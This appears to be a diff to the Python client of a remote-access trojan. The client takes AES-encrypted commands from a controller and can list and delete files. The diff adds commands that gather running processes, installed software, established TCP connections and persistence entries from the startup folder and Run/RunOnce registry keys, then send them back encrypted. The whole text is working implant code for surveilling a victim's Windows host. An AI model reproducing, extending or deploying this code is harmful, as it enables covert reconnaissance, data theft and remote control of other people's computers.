@@ -9,6 +9,8 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from pathlib import Path
 from datetime import datetime
+import psutil
+import winreg
 
 class EntryPoint:
     @staticmethod
@@ -67,7 +69,7 @@ class MainForm:
                     self.client = None
 
                 print(f"Exception in Connect: {ex}")
-                time.sleep(4)  # Retry after delay
+            time.sleep(4)  # Retry after delay
 
     def read(self):
         print("Starting read method...")
@@ -78,7 +80,7 @@ class MainForm:
                     print(f"Read: Message received: {message}")
                     message = self.AESDecrypt(message, self.encryption_key)
                     print(f"Read: Decrypted message: {message}")
-                    self.parse(message)
+                    self.parse(message)     
         except Exception as e:
             print(f"Exception in Read: {e}")
             time.sleep(4)
@@ -105,6 +107,16 @@ class MainForm:
                 self.restart_application()
             elif msg.startswith("Close"):
                 exit(0)
+            elif msg.startswith("GetProcess"):
+                self.SendProcess()
+            elif msg.startswith("Software"):
+                self.GetInstalledSoftware()
+            elif msg.startswith("GetTCPConnections"):
+                tcp_connections = self.GetTCPConnections()
+                encrypted_data = self.AESEncrypt("TCPConnections" + tcp_connections, self.encryption_key)
+                self.send(encrypted_data)
+            elif msg.startswith("GetStartup"):
+                self.GetStartupEntries()    
             elif msg.startswith("ListDrives"):
                 self.list_drives()
             elif msg.startswith("ListFiles"):
@@ -298,6 +310,100 @@ class MainForm:
             os.rmdir(path)
         except Exception as e:
             print(f"Error in deleteDirectory: {e}")
+
+
+    #region process list
+    def SendProcess(self):
+        try:
+            items = []
+
+            for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'status', 'create_time']):
+                try:
+                    process_name = proc.info['name']
+                    memory_usage = f"{proc.info['memory_info'].private / 1024:.0f} K"
+                    responding = 'True' if proc.info['status'] == psutil.STATUS_RUNNING else 'False'
+                    start_time = datetime.fromtimestamp(proc.info['create_time']).isoformat()
+                    pid = proc.info['pid']
+                    items.append(f"{process_name}|{memory_usage}|{responding}|{start_time}|{pid}")
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    continue
+
+            items_str = '\r\n'.join(items)
+            self.send(self.AESEncrypt("GetProcess" + items_str, self.encryption_key))
+        except Exception as e:
+            print(f"Error in SendProcess: {e}")
+
+    def GetInstalledSoftware(self):
+        try:
+            regpath = r"Software\Microsoft\Windows\CurrentVersion\Uninstall"
+            software_list = []
+            software_count = 0
+
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, regpath) as regkey:
+                for i in range(0, winreg.QueryInfoKey(regkey)[0]):
+                    try:
+                        subkey_name = winreg.EnumKey(regkey, i)
+                        with winreg.OpenKey(regkey, subkey_name) as subkey:
+                            value = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                            if any(exclude in value for exclude in ["Hotfix", "Security Update", "Update for"]):
+                                continue
+                            software_list.append(value)
+                            software_count += 1
+                    except FileNotFoundError:
+                        continue
+
+            software_str = "Software|" + str(software_count) + '|'.join(software_list)
+            self.send(self.AESEncrypt(software_str, self.encryption_key))
+        except Exception as e:
+            print(f"Error in GetInstalledSoftware: {e}")
+
+    def GetTCPConnections(self):
+        try:
+            items = []
+
+            for conn in psutil.net_connections(kind='tcp'):
+                if conn.status == psutil.CONN_ESTABLISHED:
+                    local_address = f"{conn.laddr.ip}:{conn.laddr.port}"
+                    remote_address = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
+                    state = conn.status
+                    items.append(f"{local_address}|{remote_address}|{state}")
+
+            return '\r\n'.join(items).strip()
+        except Exception as e:
+            print(f"Error in GetTCPConnections: {e}")
+            return None
+
+    def GetStartupEntries(self):
+        try:
+            startup_folder_path = Path(os.getenv('APPDATA')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+            files = list(startup_folder_path.glob('*'))
+
+            regpaths = [
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+            ]
+            regroots = [winreg.HKEY_CURRENT_USER, winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_LOCAL_MACHINE]
+            items = []
+
+            for file in files:
+                items.append(f"{startup_folder_path}|{file.name}|{file}")
+
+            for root, path in zip(regroots, regpaths):
+                with winreg.OpenKey(root, path) as regkey:
+                    for i in range(winreg.QueryInfoKey(regkey)[1]):
+                        value_name, value, _ = winreg.EnumValue(regkey, i)
+                        items.append(f"{path}|{value_name}|{value}")
+
+            items_str = '\r\n'.join(items)
+            self.send(self.AESEncrypt("Strtp" + items_str, self.encryption_key))
+        except Exception as e:
+            print(f"Error in GetStartupEntries: {e}")
+
+    #end region
+
+
 
 if __name__ == "__main__":
     EntryPoint.main()
